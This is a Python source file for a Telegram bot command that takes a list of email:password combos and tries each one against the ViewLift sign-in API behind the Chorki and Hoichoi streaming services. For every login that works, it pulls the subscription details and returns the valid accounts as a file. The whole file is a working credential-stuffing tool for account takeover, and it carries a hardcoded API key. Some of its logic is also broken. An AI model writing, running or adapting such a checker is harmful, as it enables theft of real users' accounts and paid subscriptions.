import os
import requests
from tqdm import tqdm
from pyrogram import Client, filters
from pyrogram.types import Message


head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json;charset=UTF-8',
}


@Client.on_message(filters.command("chor", ["/", "."]))
async def hoichoi_helper_command(app: Client, message: Message):
    return await message.reply_text(
        text="We are currently working on this feature. Please try again later."
    )
    status = await message.reply_text('<i>Chorki Checking...</i>')
    try:
        # Check if the message contains an attached document
        if message.reply_to_message and message.reply_to_message.document:
            document = await app.download_media(message.reply_to_message.document)
            combos = []
            with open(document, 'r', encoding='utf-8') as file:
                number_combo = file.readlines()
            if len(number_combo) > 1000:
                os.remove(document)
                return await status.edit_text('Only Support 1000 Combo At a Time!')
            else:
                for line in file:
                    combo = line.strip()  # Remove leading/trailing whitespaces
                    combos.append(combo)
            os.remove(document)  # Delete the downloaded combo file
        else:
            # No attached document or invalid reply, notify the user
            await status.edit_text(text='</b>Please reply with a valid combo.txt file😡.</b>')
            return

        session_request = requests.Session()

        total_combos = len(combos)
        checked_combos = 0
        success_count = 0
        error_count = 0
        success_log = []

        with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
            for combo in progress_bar:
                combo_split = combo.split(':')
                if len(combo_split) != 2:
                    # Invalid combo format, skip to the next combo
                    continue

                inpumail = combo_split[0]
                inpupass = combo_split[1]

                email = f'"email":"{inpumail}"'
                password = f'"password":"{inpupass}"'

                url = 'https://api-internal-us-east-1.viewlift.com/identity/signin?site=prothomalo&deviceId=browser-6e99f37e-aa11-517c-404f-d9ea83111c58'
                payload = '{%s,%s}' % (email, password)
                response = session_request.post(
                    url, headers=head, data=payload)
                # result = response.json()
                # print(result)

                if response.status_code == 200:
                    urls = "https://prod-api.viewlift.com/subscription/user?site=prothomalo"
                    Token = response.json()['authorizationToken']
                    userid = response.json()['userId']
                    headers = {
                        'Host': 'prod-api.viewlift.com',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Authorization': Token,
                        'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                        'Content-Type': 'application/json',
                        'Origin': 'https://www.hoichoi.tv',
                        'Connection': 'keep-alive',
                        'Referer': 'https://www.hoichoi.tv/',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'cross-site',
                        'Pragma': 'no-cache',
                        'Cache-Control': 'no-cache',
                        'TE': 'trailers'
                    }

                    params = {
                        'userId': userid
                    }
                    result = session_request.get(
                        url=urls, headers=headers, params=params)
                    if result.status_code == 200:
                        data = result.json()['subscriptionInfo']
                        suscription_start = data['subscriptionStartDate']
                        suscription_end = data['subscriptionEndDate']
                        countryCode = data['countryCode']
                        numberOfAllowedDevices = data['numberOfAllowedDevices']
                        # autoRenewStatus = data['autoRenewStatus']
                        paymentHandlerDisplayName = data['paymentHandlerDisplayName']
                        success_count += 1
                        # print(result)
                        pro_message = f"""
<b>𝘾𝙝𝙤𝙧𝙠𝙞 𝙇𝙤𝙜𝙞𝙣 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡 ✅</b>
𝑪𝒐𝒎𝒃𝒐: <code>{combo}</code>
𝑺𝒖𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏_𝑺𝒕𝒂𝒓𝒕: <code>{suscription_start}</code>
𝑺𝒖𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏_𝑬𝒏𝒅: <code>{suscription_end}</code>
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆: <code>{countryCode}</code>
𝑫𝒆𝒗𝒊𝒄𝒆𝒔: <code>{numberOfAllowedDevices}</code>
𝑷𝒂𝒚𝒎𝒆𝒏𝒕: <code>{paymentHandlerDisplayName}</code>
𝑹𝒆𝒏𝒆𝒘 𝑺𝒕𝒂𝒕𝒖𝒔: <code>None</code>
"""
                        success_log.append(combo)
                        await message.reply_text(pro_message)
                        print(success_log)

                elif response.status_code != 200:
                    # code = result.get('code')
                    # messg = result.get('error')
                    error_count += 1
                    continue

                elif result.get('isSubscribed') is False:
                    continue

                # Update progress in Telegram chat
                progress_text = f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n' \
                                f'<b>Success Count:</b> {success_count}\n' \
                                f'<b>Error Count:</b> {error_count}\n' \
                                f'<b>Combo:</b> {combo}'
                await status.edit_text(text=progress_text)

        if success_log:
            # Output success log
            success_log_text = '\n'.join(success_log)
            with open('Chorki_Account.txt', 'w', encoding='utf-8') as file:
                file.write(success_log_text)
            await app.send_document(message.chat.id, 'Chorki_Account.txt')
            # Delete the success log file
            os.remove('Chorki_Account.txt')

        # Generate final status message
        message_text = (
            f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n'
            f'<b>Success Count:</b> {success_count}\n'
            f'<b>Error Count:</b> {error_count}'
        )

        await status.edit_text(message_text)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the request: {e}")
        await status.edit_text(text="<b>An error occurred during the request. Please try again later.</b>")

    except KeyError as e:
        print("Failed to parse the response JSON.", e)
        await status.edit_text(text=f"<b>Failed to parse the response JSON. Please try again later.</b>{e}")
